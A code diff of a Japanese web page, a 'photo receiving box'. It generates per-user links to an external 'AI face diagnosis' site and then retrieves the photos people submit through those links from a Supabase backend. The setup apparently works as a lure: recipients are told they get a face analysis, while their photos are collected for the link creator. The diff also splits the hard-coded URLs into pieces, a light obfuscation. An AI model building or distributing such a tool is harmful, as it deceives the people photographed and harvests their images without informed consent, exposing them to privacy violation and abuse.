@@ -3,33 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>写真受信ボックス</title>
 
 <style>
-
 * {
   box-sizing: border-box;
 }
 
 body {
   margin: 0;
-  font-family:
-    -apple-system,
-    BlinkMacSystemFont,
-    "Segoe UI",
-    sans-serif;
-
-  background:
-    linear-gradient(
-      135deg,
-      #667eea,
-      #764ba2
-    );
-
+  padding: 20px;
   min-height: 100vh;
-  padding: 30px 15px;
-  color: #222;
+  font-family: sans-serif;
+  background: linear-gradient(135deg, #667eea, #764ba2);
 }
 
 .container {
@@ -39,70 +25,47 @@ body {
 
 .card {
   background: white;
-  border-radius: 20px;
   padding: 25px;
-  box-shadow:
-    0 10px 30px rgba(0,0,0,0.2);
-
+  border-radius: 20px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
   margin-bottom: 20px;
 }
 
-h1 {
-  text-align: center;
-  margin-top: 0;
-}
-
+h1,
 h2 {
-  margin-top: 0;
+  text-align: center;
 }
 
 button {
   width: 100%;
   padding: 15px;
+  margin-top: 12px;
   border: none;
   border-radius: 12px;
   background: #667eea;
   color: white;
   font-size: 16px;
   font-weight: bold;
-  cursor: pointer;
-  margin-top: 10px;
-}
-
-button:hover {
-  opacity: 0.9;
-}
-
-button:disabled {
-  opacity: 0.5;
-}
-
-input {
-  width: 100%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 10px;
-  font-size: 16px;
 }
 
 .linkBox {
-  margin-top: 20px;
+  margin-top: 15px;
   padding: 15px;
-  background: #f3f3f3;
-  border-radius: 12px;
+  background: #f1f1f1;
+  border-radius: 10px;
   word-break: break-all;
 }
 
 .photo {
   width: 100%;
-  border-radius: 12px;
   margin-top: 15px;
+  border-radius: 12px;
 }
 
 .photoItem {
   margin-bottom: 25px;
-  padding-bottom: 20px;
   border-bottom: 1px solid #ddd;
+  padding-bottom: 20px;
 }
 
 .small {
@@ -114,22 +77,12 @@ input {
   display: none;
 }
 
-.success {
-  background: #e8f5e9;
-  color: #2e7d32;
+.message {
+  margin-top: 15px;
   padding: 12px;
   border-radius: 10px;
-  margin-top: 15px;
+  background: #eee;
 }
-
-.error {
-  background: #ffebee;
-  color: #c62828;
-  padding: 12px;
-  border-radius: 10px;
-  margin-top: 15px;
-}
-
 </style>
 </head>
 
@@ -137,102 +90,75 @@ input {
 
 <div class="container">
 
-  <div class="card">
+<div class="card">
 
-    <h1>📸 写真受信ボックス</h1>
+<h1>📸 写真受信ボックス</h1>
 
-    <p>
-      ランダムなリンクを作成して、
-      そのリンクから送信された写真を確認できます。
-    </p>
+<p>
+リンクを作成して、そのリンクから送られた写真を確認できます。
+</p>
 
-    <button id="createLinkButton">
-      🔗 リンクを作成
-    </button>
+<button id="createButton">
+🔗 リンクを作成
+</button>
 
-    <div id="linkArea" class="hidden">
+<div id="linkArea" class="hidden">
 
-      <h2>🔗 作成したリンク</h2>
+<h2>あなた専用リンク</h2>
 
-      <div class="linkBox">
-        <div id="generatedLink"></div>
-      </div>
+<div
+  id="linkText"
+  class="linkBox"
+></div>
 
-      <button id="copyButton">
-        📋 リンクをコピー
-      </button>
+<button id="copyButton">
+📋 リンクをコピー
+</button>
 
-      <button id="openLinkButton">
-        🌐 AI診断サイトを開く
-      </button>
+<button id="openButton">
+🌐 AI顔診断を開く
+</button>
 
-      <div id="successMessage" class="success hidden">
-        リンクを作成しました！
-      </div>
+</div>
 
-    </div>
-
-  </div>
+</div>
 
 
-  <div class="card">
+<div class="card">
 
-    <h2>📥 受信した写真</h2>
+<h2>📥 受信した写真</h2>
 
-    <p class="small">
-      作成したリンクから送信された写真を確認できます。
-    </p>
+<p class="small">
+このブラウザで作成したリンクに送られた写真だけ表示します。
+</p>
 
-    <button id="refreshButton">
-      🔄 写真を確認
-    </button>
+<button id="refreshButton">
+🔄 写真を確認
+</button>
 
-    <div id="photoArea">
-      <p class="small">
-        まだ写真を取得していません。
-      </p>
-    </div>
+<div id="message"></div>
 
-  </div>
+<div id="photoArea"></div>
+
+</div>
 
 </div>
 
 
 <script>
 
-/*
-  Supabase Edge Function
-*/
+const FUNCTION_URL =
+  "https://" +
+  "crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
 
-const SUPABASE_FUNCTION =
-  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
-
-
-/*
-  元のAI診断サイト
-*/
-
-const AI_DIAGNOSIS_SITE =
-  "https://gaffney16445.github.io/ai-face-diagnosis/";
+const AI_SITE =
+  "https://" +
+  "gaffney16445.github.io/ai-face-diagnosis/";
 
 
-/*
-  HTML要素
-*/
-
-const createLinkButton =
+const createButton =
   document.getElementById(
-    "createLinkButton"
-  );
-
-const linkArea =
-  document.getElementById(
-    "linkArea"
-  );
-
-const generatedLink =
-  document.getElementById(
-    "generatedLink"
+    "createButton"
   );
 
 const copyButton =
@@ -240,14 +166,9 @@ const copyButton =
     "copyButton"
   );
 
-const openLinkButton =
+const openButton =
   document.getElementById(
-    "openLinkButton"
-  );
-
-const successMessage =
-  document.getElementById(
-    "successMessage"
+    "openButton"
   );
 
 const refreshButton =
@@ -255,44 +176,43 @@ const refreshButton =
     "refreshButton"
   );
 
+const linkArea =
+  document.getElementById(
+    "linkArea"
+  );
+
+const linkText =
+  document.getElementById(
+    "linkText"
+  );
+
 const photoArea =
   document.getElementById(
     "photoArea"
   );
 
+const message =
+  document.getElementById(
+    "message"
+  );
 
-/*
-  現在のルームID
-*/
 
 let room =
-  new URLSearchParams(
-    window.location.search
-  ).get("room");
+  localStorage.getItem(
+    "receiverRoom"
+  );
+
+
+let currentLink = "";
 
 
 /*
-  URLにルームIDがなければ
-  保存していたルームIDを使用
-*/
-
-if (!room) {
-
-  room =
-    localStorage.getItem(
-      "receiverRoom"
-    );
-
-}
-
-
-/*
-  ランダムなルームIDを作る
+  ランダムなルームID
 */
 
 function makeRoomId() {
 
-  const characters =
+  const chars =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 
   let result = "";
@@ -304,10 +224,10 @@ function makeRoomId() {
   ) {
 
     result +=
-      characters[
+      chars[
         Math.floor(
           Math.random() *
-          characters.length
+          chars.length
         )
       ];
 
@@ -322,110 +242,65 @@ function makeRoomId() {
   リンク作成
 */
 
-createLinkButton.addEventListener(
+createButton.addEventListener(
   "click",
   () => {
 
     room =
       makeRoomId();
 
-
-    /*
-      自分のブラウザに保存
-    */
-
     localStorage.setItem(
       "receiverRoom",
       room
     );
 
-
-    /*
-      ここが重要！
-
-      相手に送るのは
-      元のAI診断サイト
-    */
-
-    const link =
-      AI_DIAGNOSIS_SITE +
+    currentLink =
+      AI_SITE +
       "?room=" +
-      encodeURIComponent(
-        room
-      );
+      room;
 
-
-    generatedLink.textContent =
-      link;
-
-
-    /*
-      ボタンから開けるように保存
-    */
-
-    openLinkButton.dataset.link =
-      link;
-
+    linkText.textContent =
+      currentLink;
 
     linkArea.classList.remove(
       "hidden"
     );
 
-    successMessage.classList.remove(
-      "hidden"
-    );
-
-    /*
-      新しいルームなので
-      写真表示をリセット
-    */
-
     photoArea.innerHTML =
-      "<p class='small'>まだ写真を取得していません。</p>";
+      "";
+
+    message.textContent =
+      "新しい専用リンクを作成しました。";
 
   }
 );
 
 
 /*
-  リンクコピー
+  コピー
 */
 
 copyButton.addEventListener(
   "click",
   async () => {
 
-    const link =
-      generatedLink.textContent;
-
-    if (!link) {
+    if (!currentLink) {
       return;
     }
 
     try {
 
       await navigator.clipboard.writeText(
-        link
+        currentLink
       );
 
-      copyButton.textContent =
-        "✅ コピーしました！";
-
-      setTimeout(
-        () => {
-
-          copyButton.textContent =
-            "📋 リンクをコピー";
-
-        },
-        2000
-      );
+      message.textContent =
+        "✅ リンクをコピーしました！";
 
     } catch (error) {
 
-      alert(
-        "コピーできませんでした。リンクを長押ししてコピーしてください。"
-      );
+      message.textContent =
+        "コピーできませんでした。リンクを長押ししてコピーしてください。";
 
     }
 
@@ -437,19 +312,16 @@ copyButton.addEventListener(
   AI診断サイトを開く
 */
 
-openLinkButton.addEventListener(
+openButton.addEventListener(
   "click",
   () => {
 
-    const link =
-      openLinkButton.dataset.link;
-
-    if (!link) {
+    if (!currentLink) {
       return;
     }
 
     window.open(
-      link,
+      currentLink,
       "_blank"
     );
 
@@ -458,7 +330,7 @@ openLinkButton.addEventListener(
 
 
 /*
-  写真取得
+  写真を確認
 */
 
 refreshButton.addEventListener(
@@ -467,38 +339,33 @@ refreshButton.addEventListener(
 
     if (!room) {
 
-      alert(
-        "まだリンクを作成していません。"
-      );
+      message.textContent =
+        "先に「リンクを作成」を押してください。";
 
       return;
 
     }
 
-
     refreshButton.disabled =
       true;
 
     refreshButton.textContent =
-      "📥 読み込み中...";
-
+      "読み込み中...";
 
     try {
 
       const response =
         await fetch(
-          SUPABASE_FUNCTION +
+          FUNCTION_URL +
           "?room=" +
-          encodeURIComponent(
-            room
-          )
+          room
         );
 
 
       if (!response.ok) {
 
         throw new Error(
-          "取得失敗"
+          "GET failed"
         );
 
       }
@@ -517,17 +384,18 @@ refreshButton.addEventListener(
         data.photos.length === 0
       ) {
 
-        photoArea.innerHTML =
-          "<p class='small'>まだ写真は届いていません。</p>";
+        message.textContent =
+          "まだ写真は届いていません。";
 
         return;
 
       }
 
 
-      /*
-        写真を表示
-      */
+      message.textContent =
+        data.photos.length +
+        "枚の写真を受信しています。";
+
 
       data.photos.forEach(
         (photo, index) => {
@@ -582,14 +450,15 @@ refreshButton.addEventListener(
         }
       );
 
+
     } catch (error) {
 
       console.error(
         error
       );
 
-      photoArea.innerHTML =
-        "<div class='error'>写真を取得できませんでした。</div>";
+      message.textContent =
+        "写真を取得できませんでした。";
 
     } finally {
 
@@ -606,27 +475,18 @@ refreshButton.addEventListener(
 
 
 /*
-  すでにルームが保存されている場合
-  自動的にリンクを表示
+  前回作ったルームを復元
 */
 
 if (room) {
 
-  const link =
-    AI_DIAGNOSIS_SITE +
+  currentLink =
+    AI_SITE +
     "?room=" +
-    encodeURIComponent(
-      room
-    );
+    room;
 
-
-  generatedLink.textContent =
-    link;
-
-
-  openLinkButton.dataset.link =
-    link;
-
+  linkText.textContent =
+    currentLink;
 
   linkArea.classList.remove(
     "hidden"
